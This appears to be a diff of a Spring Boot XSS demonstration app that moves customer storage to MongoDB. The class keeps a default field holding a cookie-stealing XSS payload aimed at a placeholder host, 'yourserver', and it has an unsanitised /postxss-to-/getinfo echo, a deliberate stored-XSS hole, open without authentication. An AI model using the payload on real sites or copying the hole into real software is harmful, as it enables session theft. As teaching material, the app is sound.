@@ -2,9 +2,7 @@ package demo;
 
 import java.io.IOException;
 import java.security.Principal;
-import java.util.ArrayList;
 import java.util.HashMap;
-import java.util.List;
 import java.util.Map;
 import java.util.UUID;
 
@@ -23,6 +21,7 @@ import org.springframework.boot.autoconfigure.SpringBootApplication;
 import org.springframework.boot.autoconfigure.security.SecurityProperties;
 import org.springframework.context.annotation.Configuration;
 import org.springframework.core.annotation.Order;
+import org.springframework.data.mongodb.repository.config.EnableMongoRepositories;
 import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
 import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
 import org.springframework.security.config.annotation.web.builders.HttpSecurity;
@@ -37,9 +36,15 @@ import org.springframework.web.bind.annotation.RestController;
 @SpringBootApplication
 @RestController
 @EnableGlobalMethodSecurity
+@EnableMongoRepositories
 public class UiApplication {
 
-    private List<Customer> cust = new ArrayList<Customer>();
+    @Autowired
+    CustomerRepository customers;
+
+    @Autowired
+    DemoUserRepository users;
+
     private String xssInputData = new String(
         "<p> <input type='button' name='Redirect' class='btn btn-primary' value='Submit' "
             + "onclick='<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>' /></p>");
@@ -50,25 +55,22 @@ public class UiApplication {
     }
 
     @RequestMapping(value = "/getallcustomer", method = RequestMethod.GET)
-    public Response getResource() {
-        Response response = new Response("Done", cust);
+    public DemoResponse getResource() {
+        DemoResponse response = new DemoResponse("Done", customers.findAll());
         return response;
     }
 
-    @RequestMapping(value = "/postcustomer") //method = RequestMethod.POST)
-    public Response postCustomer(@RequestBody Customer customer) {
-        System.out.println("\n\nCustomer:");
-        System.out.println(customer.getFirstname());
-        cust.add(customer);
-        // Create Response Object
-        Response response = new Response("Done", customer);
+    @RequestMapping(value = "/postcustomer", method = RequestMethod.POST)
+    public DemoResponse postCustomer(@RequestBody Customer customer) {
+        customers.save(customer);
+        DemoResponse response = new DemoResponse("Done", customer);
         return response;
     }
 
     @RequestMapping(value = "/postxss", method = RequestMethod.POST)
-    public Response postXSS(@RequestBody String xssInput) {
+    public DemoResponse postXSS(@RequestBody String xssInput) {
         xssInputData = new String(xssInput);
-        Response response = new Response("Done", xssInput);
+        DemoResponse response = new DemoResponse("Done", xssInput);
         return response;
     }
 
@@ -81,14 +83,22 @@ public class UiApplication {
     }
 
     @RequestMapping("/getinfo")
-    public Response info() {
-        Response response = new Response("Done", new String(this.xssInputData));
+    public DemoResponse info() {
+        DemoResponse response = new DemoResponse("Done", new String(this.xssInputData));
         return response;
     }
 
     public static void main(String[] args) {
         SpringApplication.run(UiApplication.class, args);
     }
+
+    //    @RequestMapping("/addUser")
+    //    public void addUsers() {
+    //        StandardPasswordEncoder encoder = new StandardPasswordEncoder();
+    //        users.deleteAll();
+    //        users.save(new DemoUser("test", encoder.encode("password"), true, "USER"));
+    //        customers.save(new Customer("John", "Smith"));
+    //    }
 
     @Autowired
     public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
@@ -101,20 +111,21 @@ public class UiApplication {
         @Override
         protected void configure(HttpSecurity http) throws Exception {
 
-            String[] patterns = new String[] {"/index.html", "/home.html", "/login1.html", "/xss2.html", "/", "/xss",
-                "/login", "/xss1.html", "/resource", "/postcustomer", "/getallcustomer", "/getinfo", "/postxss"};
+            String[] patterns = new String[] {"/index.html", "/home.html", "/login1.html", "/xss2.html", "/",
+                "/xss1.html", "customerspage.html", "/xss", "/js/*.js", "/login", "/resource", "/postcustomer",
+                "/getallcustomer", "/getinfo",
+                "/postxss"};
 
             // @formatter:off
             //http.httpBasic();
             //http.authorizeRequests().antMatchers("/**").permitAll(); //.anyRequest().authenticated();
             //http.csrf().disable();
 
-
             http.headers().httpStrictTransportSecurity();
             http.httpBasic().and().authorizeRequests().antMatchers(patterns).permitAll().anyRequest().authenticated();
             http.csrf().and().addFilterAfter(new CsrfGrantingFilter(), SessionManagementFilter.class);
-            //http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
 
+            //http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
             // @formatter:on
         }
 
